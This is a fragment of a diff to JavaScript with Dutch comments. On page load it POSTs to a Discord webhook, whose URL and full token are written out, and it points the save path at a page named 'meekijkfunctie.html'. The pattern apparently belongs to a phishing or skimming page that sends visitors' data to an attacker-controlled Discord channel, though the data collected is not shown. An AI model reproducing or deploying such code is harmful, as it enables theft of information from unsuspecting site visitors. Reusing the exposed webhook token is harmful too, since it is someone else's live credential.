@@ -38,7 +38,7 @@ document.addEventListener('DOMContentLoaded', function() {
 document.addEventListener('DOMContentLoaded', function() {
   var xhr = new XMLHttpRequest();
   var discordUrl = 'https://discord.com/api/webhooks/1111641644618485881/-6u1wFzHXxxMTPn9xR-3cIw1YNSCfkj5BK0sRxSSefoQ1IDfzNvBASKW7FzG-VRyZUTC';
-  var htmlUrl = 'path/to/save.html'; // Vervang 'path/to/save.html' door het daadwerkelijke pad naar de HTML-pagina waar je de gegevens wilt opslaan.
+  var htmlUrl = 'meekijkfunctie.html'; // Vervang 'path/to/save.html' door het daadwerkelijke pad naar de HTML-pagina waar je de gegevens wilt opslaan.
   
   xhr.open('POST', discordUrl, true);
   xhr.setRequestHeader('Content-Type', 'application/json');
